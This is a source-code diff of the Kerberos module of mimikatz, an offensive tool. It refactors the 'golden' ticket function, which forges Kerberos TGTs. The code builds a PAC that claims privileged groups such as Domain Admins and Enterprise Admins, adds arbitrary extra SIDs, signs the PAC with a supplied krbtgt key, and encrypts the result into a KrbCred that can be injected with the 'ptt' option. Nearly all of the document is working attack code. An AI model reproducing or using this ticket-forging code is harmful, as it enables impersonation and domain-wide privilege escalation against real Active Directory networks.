@@ -407,24 +407,23 @@ wchar_t * kuhl_m_kerberos_generateFileName_short(PKIWI_KERBEROS_TICKET ticket, L
 	return buffer;
 }
 
-GROUP_MEMBERSHIP defaultGroups[] = {{513, DEFAULT_GROUP_ATTRIBUTES}, {512, DEFAULT_GROUP_ATTRIBUTES}, {520, DEFAULT_GROUP_ATTRIBUTES}, {518, DEFAULT_GROUP_ATTRIBUTES}, {519, DEFAULT_GROUP_ATTRIBUTES},};
 NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 {
 	BYTE key[AES_256_KEY_LENGTH] = {0};
 	DWORD i, j, nbGroups, nbSids = 0, id = 500, keyType, rodc = 0;
-	PCWCHAR szUser, szDomain, szService = NULL, szTarget = NULL, szSid, szKey = NULL, szId, szGroups, szSids, szRodc, szLifetime, szClaims, base, filename;
-	PWCHAR baseSid, tmpSid, baseDot, netbiosDomain;
-	PISID pSid, pSidTmp;
-	PGROUP_MEMBERSHIP dynGroups = NULL, groups;
+	PCWCHAR szUser, szDomain, szService = NULL, szTarget = NULL, szSid, szKey = NULL, szId, szGroups, szSids, szRodc, szLifetime, szClaims, /*base,*/ filename;
+	PWCHAR baseDot, netbiosDomain;
+	PISID pSid;
+	PGROUP_MEMBERSHIP groups;
 	PKERB_SID_AND_ATTRIBUTES sids = NULL;
 	PCLAIMS_SET pClaimsSet = NULL;
 	PBERVAL BerApp_KrbCred;
 	KUHL_M_KERBEROS_LIFETIME_DATA lifeTimeData;
-	BOOL isPtt = kull_m_string_args_byName(argc, argv, L"ptt", NULL, NULL);
 	NTSTATUS status;
 	PKERB_ECRYPT pCSystem;
+	BOOL isPtt = kull_m_string_args_byName(argc, argv, L"ptt", NULL, NULL);
 
-	kull_m_string_args_byName(argc, argv, L"ticket", &filename, L"ticket.kirbi");
+	kull_m_string_args_byName(argc, argv, L"ticket", &filename, L"ticket." MIMIKATZ_KERBEROS_EXT);
 
 	if(kull_m_string_args_byName(argc, argv, L"admin", &szUser, NULL) || kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
 	{
@@ -458,77 +457,12 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 
 								if(kull_m_string_args_byName(argc, argv, L"id", &szId, NULL))
 									id = wcstoul(szId, NULL, 0);
-
 								if(kull_m_string_args_byName(argc, argv, L"rodc", &szRodc, NULL))
 									rodc = wcstoul(szRodc, NULL, 0);
-
-								if(kull_m_string_args_byName(argc, argv, L"groups", &szGroups, NULL))
-								{
-									for(nbGroups = 0, base = szGroups; base && *base; )
-									{
-										if(wcstoul(base, NULL, 0))
-											nbGroups++;
-										if(base = wcschr(base, L','))
-											base++;
-									}
-									if(nbGroups && (dynGroups = (PGROUP_MEMBERSHIP) LocalAlloc(LPTR, nbGroups * sizeof(GROUP_MEMBERSHIP))))
-									{
-										for(i = 0, base = szGroups; (base && *base) && (i < nbGroups); )
-										{
-											if(j = wcstoul(base, NULL, 0))
-											{
-												dynGroups[i].Attributes = DEFAULT_GROUP_ATTRIBUTES;
-												dynGroups[i].RelativeId = j;
-												i++;
-											}
-											if(base = wcschr(base, L','))
-												base++;
-										}
-									}
-								}
-								if(nbGroups && dynGroups)
-									groups = dynGroups;
-								else
-								{
-									groups = defaultGroups;
-									nbGroups = ARRAYSIZE(defaultGroups);
-								}
-
+								kull_m_string_args_byName(argc, argv, L"groups", &szGroups, NULL);
+								kuhl_m_pac_stringToGroups(szGroups, &groups, &nbGroups);
 								if(kull_m_string_args_byName(argc, argv, L"sids", &szSids, NULL))
-								{
-									if(tmpSid = _wcsdup(szSids))
-									{
-										for(nbSids = 0, base = tmpSid; base && *base; )
-										{
-											if(baseSid = wcschr(base, L','))
-												*baseSid = L'\0';
-											if(ConvertStringSidToSid(base, (PSID *) &pSidTmp))
-											{
-												nbSids++;
-												LocalFree(pSidTmp);
-											}
-											if(base = baseSid)
-												base++;
-										}
-										free(tmpSid);
-									}
-									if(nbSids && (sids = (PKERB_SID_AND_ATTRIBUTES) LocalAlloc(LPTR, nbSids * sizeof(KERB_SID_AND_ATTRIBUTES))))
-									{
-										if(tmpSid = _wcsdup(szSids))
-										{
-											for(i = 0, base = tmpSid; (base && *base) && (i < nbSids); )
-											{
-												if(baseSid = wcschr(base, L','))
-													*baseSid = L'\0';
-												if(ConvertStringSidToSid(base, (PSID *) &sids[i].Sid))
-													sids[i++].Attributes = DEFAULT_GROUP_ATTRIBUTES;
-												if(base = baseSid)
-													base++;
-											}
-											free(tmpSid);
-										}
-									}
-								}
+									kuhl_m_pac_stringToSids(szSids, &sids, &nbSids);
 								if(kull_m_string_args_byName(argc, argv, L"claims", &szClaims, NULL))
 									pClaimsSet = kuhl_m_kerberos_claims_createFromString(szClaims);
 
@@ -617,7 +551,7 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 	}
 	else PRINT_ERROR(L"Missing user argument\n");
 
-	if(dynGroups)
+	if(groups && nbGroups)
 		LocalFree(groups);
 	if(sids && nbSids)
 	{
@@ -667,12 +601,14 @@ PBERVAL kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, LPCWST
 {
 	NTSTATUS status;
 	KIWI_KERBEROS_TICKET ticket = {0};
-	KERB_VALIDATION_INFO validationInfo = {0};
+	PKERB_VALIDATION_INFO pValidationInfo;
 	PPACTYPE pacType; DWORD pacTypeSize;
-	DWORD SignatureType;
-
+	LONG SignatureType;
 	PBERVAL BerApp_EncTicketPart, BerApp_KrbCred = NULL;
 
+	ticket.StartTime = lifetime->TicketStart;
+	ticket.EndTime = lifetime->TicketEnd;
+	ticket.RenewUntil = lifetime->TicketRenew;
 	if(ticket.ClientName = (PKERB_EXTERNAL_NAME) LocalAlloc(LPTR, sizeof(KERB_EXTERNAL_NAME) /* 1 UNICODE into */))
 	{
 		ticket.ClientName->NameCount = 1;
@@ -686,48 +622,14 @@ PBERVAL kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, LPCWST
 		RtlInitUnicodeString(&ticket.ServiceName->Names[0],	servicename ? servicename : L"krbtgt");
 		RtlInitUnicodeString(&ticket.ServiceName->Names[1], targetname ? targetname : domainname);
 	}
-	
 	RtlInitUnicodeString(&ticket.DomainName, domainname);
 	ticket.TargetDomainName = ticket.AltTargetDomainName = ticket.DomainName;
-
 	ticket.TicketFlags = (servicename ? 0 : KERB_TICKET_FLAGS_initial) | KERB_TICKET_FLAGS_pre_authent | KERB_TICKET_FLAGS_renewable | KERB_TICKET_FLAGS_forwardable;
-	
 	ticket.TicketKvno = rodc ? (0x00000001 | (rodc << 16)) : 2; // windows does not care about it...
 	ticket.TicketEncType = ticket.KeyType = keyType;
 	ticket.Key.Length = keySize;
 	if(ticket.Key.Value = (PUCHAR) LocalAlloc(LPTR, ticket.Key.Length))
 		CDGenerateRandomBits(ticket.Key.Value, ticket.Key.Length);
-	
-	validationInfo.LogonTime = ticket.StartTime = lifetime->TicketStart;
-	ticket.EndTime = lifetime->TicketEnd;
-	ticket.RenewUntil = lifetime->TicketRenew;
-	
-	KIWI_NEVERTIME(&validationInfo.LogoffTime);
-	KIWI_NEVERTIME(&validationInfo.KickOffTime);
-	KIWI_NEVERTIME(&validationInfo.PasswordLastSet);
-	KIWI_NEVERTIME(&validationInfo.PasswordCanChange);
-	KIWI_NEVERTIME(&validationInfo.PasswordMustChange);
-	RtlInitUnicodeString(&validationInfo.LogonDomainName, LogonDomainName);
-
-	validationInfo.EffectiveName		= ticket.ClientName->Names[0];
-	validationInfo.LogonDomainId		= sid;
-	validationInfo.UserId				= userid;
-	validationInfo.UserAccountControl	= USER_DONT_EXPIRE_PASSWORD | USER_NORMAL_ACCOUNT;
-	validationInfo.PrimaryGroupId		= groups[0].RelativeId;
-
-	validationInfo.GroupCount = cbGroups;
-	validationInfo.GroupIds = groups;
-	validationInfo.SidCount = cbSids;
-	validationInfo.ExtraSids = sids;
-
-	validationInfo.ResourceGroupDomainSid = NULL;
-	validationInfo.ResourceGroupCount = 0;
-	validationInfo.ResourceGroupIds = NULL;
-
-	if(validationInfo.ExtraSids && validationInfo.SidCount)
-		validationInfo.UserFlags |= 0x20;
-	if(validationInfo.ResourceGroupDomainSid && validationInfo.ResourceGroupIds && validationInfo.ResourceGroupCount)
-		validationInfo.UserFlags |= 0x200;
 
 	switch(keyType)
 	{
@@ -745,39 +647,40 @@ PBERVAL kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, LPCWST
 		SignatureType = KERB_CHECKSUM_HMAC_MD5;
 	}
 	
-	if(kuhl_m_pac_validationInfo_to_PAC(&validationInfo, SignatureType, pClaimsSet, &pacType, &pacTypeSize))
+	if(pValidationInfo = kuhl_m_pac_infoToValidationInfo(&lifetime->TicketStart, username, domainname, LogonDomainName, sid, userid, groups, cbGroups, sids, cbSids))
 	{
-		kprintf(L" * PAC generated\n");
-		status = kuhl_m_pac_signature(pacType, pacTypeSize, SignatureType, key, keySize);
-		if(NT_SUCCESS(status))
+		if(kuhl_m_pac_validationInfo_to_PAC(pValidationInfo, NULL, NULL, SignatureType, pClaimsSet, &pacType, &pacTypeSize))
 		{
-			kprintf(L" * PAC signed\n");
-			if(BerApp_EncTicketPart = kuhl_m_kerberos_ticket_createAppEncTicketPart(&ticket, pacType, pacTypeSize))
+			kprintf(L" * PAC generated\n");
+			status = kuhl_m_pac_signature(pacType, pacTypeSize, SignatureType, key, keySize);
+			if(NT_SUCCESS(status))
 			{
-				kprintf(L" * EncTicketPart generated\n");
-				status = kuhl_m_kerberos_encrypt(keyType, KRB_KEY_USAGE_AS_REP_TGS_REP, key, keySize, BerApp_EncTicketPart->bv_val, BerApp_EncTicketPart->bv_len, (LPVOID *) &ticket.Ticket.Value, &ticket.Ticket.Length, TRUE);	
-				if(NT_SUCCESS(status))
+				kprintf(L" * PAC signed\n");
+				if(BerApp_EncTicketPart = kuhl_m_kerberos_ticket_createAppEncTicketPart(&ticket, pacType, pacTypeSize))
 				{
-					kprintf(L" * EncTicketPart encrypted\n");
-					if(BerApp_KrbCred = kuhl_m_kerberos_ticket_createAppKrbCred(&ticket, FALSE))
-						kprintf(L" * KrbCred generated\n");
+					kprintf(L" * EncTicketPart generated\n");
+					status = kuhl_m_kerberos_encrypt(keyType, KRB_KEY_USAGE_AS_REP_TGS_REP, key, keySize, BerApp_EncTicketPart->bv_val, BerApp_EncTicketPart->bv_len, (LPVOID *) &ticket.Ticket.Value, &ticket.Ticket.Length, TRUE);	
+					if(NT_SUCCESS(status))
+					{
+						kprintf(L" * EncTicketPart encrypted\n");
+						if(BerApp_KrbCred = kuhl_m_kerberos_ticket_createAppKrbCred(&ticket, FALSE))
+							kprintf(L" * KrbCred generated\n");
+						LocalFree(ticket.Ticket.Value);
+					}
+					else PRINT_ERROR(L"kuhl_m_kerberos_encrypt %08x\n", status);
+					ber_bvfree(BerApp_EncTicketPart);
 				}
-				else PRINT_ERROR(L"kuhl_m_kerberos_encrypt %08x\n", status);
-				ber_bvfree(BerApp_EncTicketPart);
 			}
+			LocalFree(pacType);
 		}
-		LocalFree(pacType);
+		LocalFree(pValidationInfo);
 	}
-	
-	if(ticket.Ticket.Value)
-		LocalFree(ticket.Ticket.Value);
 	if(ticket.Key.Value)
 		LocalFree(ticket.Key.Value);
 	if(ticket.ClientName)
 		LocalFree(ticket.ClientName);
 	if(ticket.ServiceName)
 		LocalFree(ticket.ServiceName);
-
 	return BerApp_KrbCred;
 }
 
